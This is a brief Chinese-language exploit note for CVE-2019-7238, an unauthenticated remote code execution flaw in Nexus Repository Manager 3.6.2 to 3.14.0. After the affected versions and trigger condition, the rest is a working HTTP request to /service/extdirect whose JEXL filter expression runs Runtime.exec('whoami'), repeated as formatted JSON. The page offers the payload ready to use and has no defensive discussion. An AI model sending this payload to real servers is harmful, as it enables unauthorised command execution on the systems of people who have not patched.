# 未授权RCE CVE-2019-7238

### 未授权RCE CVE-2019-7238

影响范围:Nexus Repository Manager OSS/Pro 3.6.2版本到3.14.0版本

触发条件:需要maven仓库内必须要至少一个包，如果没有需要登陆后自行上传一个任意包

```bash
POST /service/extdirect HTTP/1.1 
Host: xxx.xxx.xxx.xxx:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0 
Accept: */* 
Content-Type: application/json 
Content-Length: 725 
Connection: close 
{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"1.class.forName('java.lang.Runtime').getRuntime().exec('whoami')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":11}
```

payload json格式

```bash
{
  "action": "coreui_Component",
  "method": "previewAssets",
  "data": [
    {
      "page": 1,
      "start": 0,
      "limit": 50,
      "sort": [
        {
          "property": "name",
          "direction": "ASC"
        }
      ],
      "filter": [
        {
          "property": "repositoryName",
          "value": "*"
        },
        {
          "property": "expression",
          "value": "1.class.forName('java.lang.Runtime').getRuntime().exec('whoami')"
        },
        {
          "property": "type",
          "value": "jexl"
        }
      ]
    }
  ],
  "type": "rpc",
  "tid": 11
}
```

